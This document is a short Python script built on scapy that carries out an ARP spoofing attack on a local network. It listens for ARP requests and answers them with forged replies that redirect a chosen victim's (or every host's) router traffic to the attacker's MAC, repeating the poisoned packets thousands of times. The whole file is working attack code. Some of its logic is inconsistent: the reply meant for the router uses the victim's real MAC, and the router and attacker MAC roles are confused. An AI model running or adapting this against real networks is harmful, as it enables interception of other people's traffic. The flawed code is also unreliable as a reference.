from scapy.all import *
import threading
import time
from datetime import datetime

routerIp = "192.168.1.1" # IP address of the router
routerMac = "5c:e0:c5:d6:45:5c" # MAC of your PC
targetIp = "192.168.1.8" # Target you want to spoof, leave as an empty string if you want to spoof all

def SendContinuosly(packetToVictim, packetToRouter):
    for i in range(5000):
        sendp(packetToVictim, verbose=0)
        sendp(packetToRouter, verbose=0)
        time.sleep(0.1)

def HandlePacket(pkt):
    victimIp = pkt[ARP].psrc
    if victimIp == targetIp or targetIp == "":
        print("Sniffed a packet from " + pkt.psrc)
        victimMac = pkt[ARP].hwsrc
        etherPkt = Ether(dst=pkt[ARP].hwsrc, src=routerMac)
        spoofedReplyToVictim = ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc, psrc=routerIp, hwsrc=routerMac)
        finalPacket = etherPkt/spoofedReplyToVictim
        routerEther = Ether(dst=routerMac, src=victimMac)
        arpToRouter = routerEther/ARP(op=2, pdst=routerIp, hwdst=routerMac, psrc=victimIp, hwsrc=victimMac)
        sendp(finalPacket, verbose=0)
        sendp(arpToRouter, verbose=0)
        t = threading.Thread(target=lambda: SendContinuosly(finalPacket, arpToRouter))
        t.start()

def IsARPQuery(pkt):
    return pkt.haslayer(ARP) and pkt[ARP].op == 1


print(f"started at {datetime.now().strftime('%H:%M:%S')}")
sniff(filter="arp", prn=lambda x: HandlePacket(x) if IsARPQuery(x) else None)
def DontDoNothing(pkt):
    return
sniff(prn=DontDoNothing, store=0)
